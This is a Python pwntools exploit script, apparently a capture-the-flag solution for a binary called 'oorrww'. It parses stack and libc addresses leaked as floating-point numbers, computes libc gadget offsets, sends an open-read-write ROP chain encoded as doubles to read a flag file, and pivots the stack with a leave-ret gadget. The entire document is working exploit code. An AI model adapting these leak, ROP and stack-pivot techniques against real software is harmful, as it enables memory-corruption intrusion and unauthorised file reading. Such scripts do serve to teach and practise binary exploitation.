from pwn import *
context(log_level='debug', arch='x86', terminal=['tmux', 'splitw', '-h'])

io = process("./oorrww")
elf = ELF("./oorrww")
libc = ELF("./libc.so.6")


def double_float(value):
    return str(struct.unpack("!d", p64(value)[::-1])[0])


def double_to_hex(val):
    return int.from_bytes(struct.pack("d", val), "little")


io.recvuntil(b"you: ")

stack_addr = double_to_hex(float(io.recvuntil(b" ", drop=True)))
log.success("stack_addr: " + hex(stack_addr))

leak_addr = double_to_hex(
    float(io.recvuntil(b"!", drop=True)))-libc.sym[b"__isoc99_scanf"]
log.success("leak_addr: " + hex(leak_addr))


pop_rdi = leak_addr+0x2a3e5
pop_rsi = leak_addr+0x16333a
leave_ret = leak_addr+0x4da83
pop_rdx_rbx = leak_addr+0x904a9

open_a = leak_addr+libc.sym[b"open"]
read_a = leak_addr+libc.sym[b"read"]
write_a = leak_addr+libc.sym[b"write"]

orw = [
    double_float(pop_rdi), double_float(
        stack_addr+0x90), double_float(pop_rsi), double_float(0), double_float(open_a),
    double_float(pop_rdi), double_float(3), double_float(pop_rsi), double_float(stack_addr+0x200), double_float(
        pop_rdx_rbx), double_float(0x50), double_float(0x50), double_float(read_a),
    double_float(pop_rdi), double_float(2), double_float(
        pop_rsi), double_float(stack_addr+0x200), double_float(write_a)
]

for i in range(18):
    io.sendlineafter(b"input:\n", orw[i])


io.sendlineafter(b"input:\n", double_float(0x7478742e67616c66))

for i in range(1):
    io.sendlineafter(b"input:\n", b"-")

io.sendlineafter(b"input:\n", double_float(stack_addr-0x8))

io.sendlineafter(b"input:\n", double_float(leave_ret))

io.interactive()
